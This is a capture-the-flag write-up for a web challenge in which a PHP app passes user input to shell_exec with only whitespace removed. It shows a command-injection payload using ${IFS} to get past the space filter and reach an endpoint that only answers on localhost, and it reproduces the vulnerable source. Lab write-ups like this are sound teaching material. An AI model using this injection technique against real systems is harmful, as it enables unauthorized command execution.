# Web :: Gadget Santa

*It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?*

### Challenge Files: [web_gadget_santa.zip](web_gadget_santa.zip)

For this challenge, there is a docker component that hosts the vulnerable website, but you are provided with the challenge files to develop an exploit.

On this website, we are able to click a few buttons to see the status of different things in Santa's workshop (sorry I forgot to get a screenshot). Looking into the source code, we can see that these commands are filtered by removing any spaces, and then passed into the php *shell_exec()* function as a parameter for **santa_mon.sh**

```php
<?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

Looking at that file, we can see that it accepts a few commands but also allows for any additional commands that are added onto the URL.

```bash
#!/bin/bash 

ups_status() {
    curl localhost:3000;
}

restart_ups() {
    curl localhost:3000/restart;
}

list_processes() {
    ps -ef
}

list_ram() {
    free -h
}

list_connections() {
    netstat -plnt
}

list_storage() {
    df -h
}

welcome() {
    echo "[+] Welcome to Santa's Monitor Gadget!"
}

if [ "$#" -gt 0 ]; then
    $1
fi

```

We can see here that some commands are being routed to localhost port 3000, which is a service that is being run by the ups_manager.py, and that there is a get_flag page but it is only accessible from localhost.

```python
#!/usr/bin/env python3
import subprocess, json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

def get_json(content):
	return json.dumps(content).encode()

def check_service():
	# Yoinks Anti Christmas elves was here!!! 😈
	if subprocess.getoutput('echo "running" #ssh ups@candyfactory.htb "systemctl show -p SubState --value PowerManager"'):
		return True
	return False

def restart_service():
	# Yoinks Anti Christmas elves was here!!! 😈
	runCmd = subprocess.getoutput('echo "sucessful" #ssh ups@candyfactory.htb "systemctl restart PowerManager.service"')
	return True

def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
```

So the trick here is that we need to pass a command that will be executed by the monitor script without any spaces and request the flag endpoint. We can use ${IFS} for this, which is read as a space on the command line so we can bypass the space filter.

Adding the command: ```;curl${IFS}127.0.0.1:3000/get_flag``` to the URL for the monitor endpoint prints the flag:

```HTB{54nt4_i5_th3_r34l_r3d_t34m3r}```